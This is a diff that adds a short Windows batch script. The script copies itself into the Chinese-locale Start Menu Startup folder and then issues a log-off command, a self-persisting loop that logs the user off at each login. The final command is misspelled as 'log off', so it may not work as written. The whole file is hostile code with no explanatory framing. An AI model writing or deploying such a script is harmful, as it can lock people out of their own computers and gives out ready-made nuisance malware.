@@ -1,0 +1,9 @@
+@echo off
+
+
+copy %0 %USERPROFILE%\「开始」菜单\程序\启动
+
+
+log off
+
+
